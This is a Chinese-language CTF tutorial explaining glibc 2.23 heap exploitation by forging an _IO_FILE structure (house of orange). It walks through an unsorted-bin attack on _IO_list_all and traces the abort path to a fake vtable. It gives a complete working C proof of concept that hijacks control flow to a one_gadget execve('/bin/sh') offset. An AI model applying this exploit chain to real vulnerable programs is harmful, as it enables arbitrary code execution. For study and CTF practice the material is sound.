&emsp;&emsp;<font size=2>伪造`_IO_FILE`这个现在其实用的是比较多的，`glibc2.23`没有做什么检查，而`glibc2.24`开始就有对`vtable`做一些检查，但绕过也非常简单，这个系列主要是讲`glibc2.23`的，因此其他的就自行搜索其他资料吧，如果以后得空了说不定也会分析一下。</font></br>

&emsp;&emsp;<font size=2>最初ctf上伪造`_IO_FILE`的好像是一个叫`house of orange`的题目，利用原理就是用`unsorted-bin attack`修改了`_IO_list_all`指向的链表，然后故意触发错误从`malloc_printerr`一路到了伪造的`vtable`上的`__overflow`，就顺势getshell了。我们先从`unsorted-bin attack`修改的`_IO_list_all`开始分析吧：</font></br>

```C
        void *p1, *p2, *p3, *p4;
        ull *p;
        ull libc_base = 0;
        ull _IO_list_all = 0x3c5520;
        ull one_gadget = 0xf1147;

        setvbufs();
        p1=malloc(0x100);
        malloc(0x20);

        free(p1);
        malloc(0xa0);

        p2 = malloc(0x100);
        // now we have a 0x60 smallbin
        //
        // avoid smallbin to be alloced, use 0x100
        malloc(0x100);

        free(p2);
        libc_base = *(ull*)p2 - 0x3c4b78;
        *((ull*)p2+1) = libc_base+_IO_list_all - sizeof(void*)*2;

        malloc(0x100);

```

&emsp;&emsp;<font size=2>这是一段利用完刚修改`_IO_list_all`的demo代码，为什么我们要修改`_IO_list_all`呢？因为这个全局变量是指向一个`_IO_FILE`结构体的`_IO_2_1_stderr_`，而这个`_IO_FILE`又是通过其中的`_chain`元素把每一个结构体串联在一起形成的链表，如果结构体有问题，那么在触发错误的时候系统会根据`_chain`查找到下一个节点。</font></br>

&emsp;&emsp;<font size=2>接下来我们再想想为什么要用`unsorted-bin attack`写入一个`main_arena`到`_IO_list_all`里去呢？写入之后，其`_chain`是什么？没错，就是`main_arena`中smallbin数组的某个size索引的堆块位置处，而这个size就是`0x60`。如下`unsorted-bin attack`完成后的情况：</font></br>

```
pwndbg> x/xg & _IO_list_all
0x7ffff7dd2520 <_IO_list_all>:	0x00007ffff7dd1b78
pwndbg> x/20xg & main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602360
0x7ffff7dd1b80 <main_arena+96>:	0x00000000006020b0	0x0000000000602140
0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd2510	0x00007ffff7dd1b88
0x7ffff7dd1ba0 <main_arena+128>:	0x00007ffff7dd1b88	0x00007ffff7dd1b98
0x7ffff7dd1bb0 <main_arena+144>:	0x00007ffff7dd1b98	0x00007ffff7dd1ba8
pwndbg> 
0x7ffff7dd1bc0 <main_arena+160>:	0x00007ffff7dd1ba8	0x00007ffff7dd1bb8
0x7ffff7dd1bd0 <main_arena+176>:	0x00007ffff7dd1bb8	0x00000000006020b0
0x7ffff7dd1be0 <main_arena+192>:	0x00000000006020b0	0x00007ffff7dd1bd8
0x7ffff7dd1bf0 <main_arena+208>:	0x00007ffff7dd1bd8	0x00007ffff7dd1be8
0x7ffff7dd1c00 <main_arena+224>:	0x00007ffff7dd1be8	0x00007ffff7dd1bf8
0x7ffff7dd1c10 <main_arena+240>:	0x00007ffff7dd1bf8	0x00007ffff7dd1c08
0x7ffff7dd1c20 <main_arena+256>:	0x00007ffff7dd1c08	0x00007ffff7dd1c18
0x7ffff7dd1c30 <main_arena+272>:	0x00007ffff7dd1c18	0x00007ffff7dd1c28
0x7ffff7dd1c40 <main_arena+288>:	0x00007ffff7dd1c28	0x00007ffff7dd1c38
0x7ffff7dd1c50 <main_arena+304>:	0x00007ffff7dd1c38	0x00007ffff7dd1c48
pwndbg> p *(struct _IO_FILE_plus*)0x00007ffff7dd1b78
$1 = {
  file = {
    _flags = 6300512, 
    _IO_read_ptr = 0x6020b0 "", 
    _IO_read_end = 0x602140 "", 
    _IO_read_base = 0x7ffff7dd2510 "", 
    _IO_write_base = 0x7ffff7dd1b88 <main_arena+104> "@!`", 
    _IO_write_ptr = 0x7ffff7dd1b88 <main_arena+104> "@!`", 
    _IO_write_end = 0x7ffff7dd1b98 <main_arena+120> "\210\033\335\367\377\177", 
    _IO_buf_base = 0x7ffff7dd1b98 <main_arena+120> "\210\033\335\367\377\177", 
    _IO_buf_end = 0x7ffff7dd1ba8 <main_arena+136> "\230\033\335\367\377\177", 
    _IO_save_base = 0x7ffff7dd1ba8 <main_arena+136> "\230\033\335\367\377\177", 
    _IO_backup_base = 0x7ffff7dd1bb8 <main_arena+152> "\250\033\335\367\377\177", 
    _IO_save_end = 0x7ffff7dd1bb8 <main_arena+152> "\250\033\335\367\377\177", 
    _markers = 0x6020b0, 
    _chain = 0x6020b0, 
    _fileno = -136504360, 
    _flags2 = 32767, 
    _old_offset = 140737351850968, 
    _cur_column = 7144, 
    _vtable_offset = -35 '\335', 
    _shortbuf = <incomplete sequence \367>, 
    _lock = 0x7ffff7dd1be8 <main_arena+200>, 
    _offset = 140737351851000, 
    _codecvt = 0x7ffff7dd1bf8 <main_arena+216>, 
    _wide_data = 0x7ffff7dd1c08 <main_arena+232>, 
    _freeres_list = 0x7ffff7dd1c08 <main_arena+232>, 
    _freeres_buf = 0x7ffff7dd1c18 <main_arena+248>, 
    __pad5 = 140737351851032, 
    _mode = -136504280, 
    _unused2 = "\377\177\000\000(\034\335\367\377\177\000\000\070\034\335\367\377\177\000"
  }, 
  vtable = 0x7ffff7dd1c38 <main_arena+280>
}
pwndbg> 
```

&emsp;&emsp;<font size=2>`_IO_list_all`被修改为`unsorted-bin list`地址，然后用`_IO_FILE`结构体去看的话`_chain`就是size为`0x60`位置的smallbin地址。这样一来在查找链表下一个节点的时候刚好落在了我们的堆块上，也就是我们有了伪造`_IO_FILE`结构的机会。不知道为啥是`0x60`的话得去好好分析一下`_int_malloc`咯，我只能告诉你放入的关键代码是：</font></br>

```C
          mark_bin (av, victim_index);
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
          bck->fd = victim;
```

&emsp;&emsp;<font size=2>接下来我们讲讲如何伪造`_IO_FILE`，假设我们触发一个堆错误，glibc里会调用`malloc_printerr`：</font></br>

```C
static void
malloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)
{
  /* Avoid using this arena in future.  We do not attempt to synchronize this
     with anything else because we minimally want to ensure that __libc_message
     gets its resources safely without stumbling on the current corruption.  */
  if (ar_ptr)
    set_arena_corrupt (ar_ptr);

  if ((action & 5) == 5)
    __libc_message (action & 2, "%s\n", str);
  else if (action & 1)
    {
      char buf[2 * sizeof (uintptr_t) + 1];

      buf[sizeof (buf) - 1] = '\0';
      char *cp = _itoa_word ((uintptr_t) ptr, &buf[sizeof (buf) - 1], 16, 0);
      while (cp > buf)
        *--cp = '0';

      __libc_message (action & 2, "*** Error in `%s': %s: 0x%s ***\n",
                      __libc_argv[0] ? : "<unknown>", str, cp);
    }
  else if (action & 2)
    abort ();
}
```

&emsp;&emsp;<font size=2>因为我们的`double free`、`link corruption`或者堆错误一般`action`参数都是`check_action`，其定义如下：</font></br>

```C
#ifndef DEFAULT_CHECK_ACTION
# define DEFAULT_CHECK_ACTION 3
#endif

static int check_action = DEFAULT_CHECK_ACTION;
/*
          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
            {
              errstr = "malloc(): memory corruption (fast)";
            errout:
              malloc_printerr (check_action, errstr, chunk2mem (victim), av);
              return NULL;
            }
*/
```

&emsp;&emsp;<font size=2>所以会调用`__libc_message`：</font></br>

```C
/* Abort with an error message.  */
void
__libc_message (int do_abort, const char *fmt, ...)
{
  va_list ap;
  int fd = -1;

  // ...
  // balabala
  
    if (do_abort)
    {
      BEFORE_ABORT (do_abort, written, fd);

      /* Kill the application.  */
      abort ();
    }
}
```

&emsp;&emsp;<font size=2>`do_abort = 3&1 = 1`，所以会调用`abort()`：</font></br>

```C
/* Cause an abnormal program termination with core-dump.  */
void
abort (void)
{
  // ...
  // balabala
  
    /* Flush all streams.  We cannot close them now because the user
     might have registered a handler for SIGABRT.  */
  if (stage == 1)
    {
      ++stage;
      fflush (NULL);
    }
```

&emsp;&emsp;<font size=2>调用的`fflush`就是`_IO_flush_all_lockp`：</font></br>

```C
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;

#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif

  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
        _IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
           || (_IO_vtable_offset (fp) == 0
               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                                    > fp->_wide_data->_IO_write_base))
#endif
           )
          && _IO_OVERFLOW (fp, EOF) == EOF)
        result = EOF;

      if (do_lock)
        _IO_funlockfile (fp);
      run_fp = NULL;

      if (last_stamp != _IO_list_all_stamp)
        {
          /* Something was added to the list.  Start all over again.  */
          fp = (_IO_FILE *) _IO_list_all;
          last_stamp = _IO_list_all_stamp;
        }
      else
        fp = fp->_chain;
    }

```

&emsp;&emsp;<font size=2>这里出现的`_IO_OVERFLOW`就是我们可以伪造的`vtable`上的函数指针，可以看到`fp`先指向`_IO_list_all`，后面有用`fp = fp->_chain`遍历。要使控制流到达我们的`_IO_OVERFLOW`需要满足：</font></br>

```C
(fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
||
(_IO_vtable_offset (fp) == 0
               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                                    > fp->_wide_data->_IO_write_base)
```

&emsp;&emsp;<font size=2>虽然第二个也可以，但是显然第一个看着就方便很多，我们直接构造为第一个就行：</font></br>

```C
        // fake _mode
        *p = 0;
        // _IO_write_base
        *(p+4) = 0;
        // _IO_write_ptr
        *(p+5) = 1;
        // __overflow in vtable
        *(p+3) = libc_base+one_gadget;
        // fake vtable
        *(ull*)((ull)p+0xd8) = (ull)p;
```

&emsp;&emsp;<font size=2>这里的p指向我们伪造的`_IO_FILE`头部，只要这样构造好：</font></br>

```C
fp->_mode = 0;
fp->_IO_write_base = 0;
fp->_IO_write_ptr = 1;
```

&emsp;&emsp;<font size=2>就能使`_IO_OVERFLOW`得到执行，而`_IO_OVERFLOW`又是`_IO_FILE_plus`中的`vtable`成员。偏移为`0xd8`，因此直接把vtable伪造为一个地址，然后在这个地址的`_IO_OVERFLOW`偏移（0x18)处放上`one_gadget`就可以了。完整demo如下：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>
#include <libio.h>

typedef unsigned long long ull;

void setvbufs()
{
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stderr, 0, 2, 0);
}
int main()
{
	void *p1, *p2, *p3, *p4;
	ull *p;
	ull libc_base = 0;
	ull _IO_list_all = 0x3c5520;
	ull one_gadget = 0xf1147;
	
	setvbufs();
	p1=malloc(0x100);
	malloc(0x20);

	free(p1);
	malloc(0xa0);

	p2 = malloc(0x100);
	// now we have a 0x60 smallbin
	//
	// avoid smallbin to be alloced, use 0x100
	malloc(0x100);

	free(p2);
	libc_base = *(ull*)p2 - 0x3c4b78;
	*((ull*)p2+1) = libc_base+_IO_list_all - sizeof(void*)*2;

	malloc(0x100);

	p = (ull*)((ull)p1+0xa0);
	// 'p' pointer to the chain of _IO_list_all
	// fake _mode
	*p = 0;
	// _IO_write_base
	*(p+4) = 0;
	// _IO_write_ptr
	*(p+5) = 1;
	// __overflow in vtable
	*(p+3) = libc_base+one_gadget;
	// fake vtable
	*(ull*)((ull)p+0xd8) = (ull)p;
	
	// unsorted bin is corrputed
	// just trigger it
	p3 = malloc(0x20);
	free(p3);
	free(p3);


	return 0;
}

/*
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
*/
```

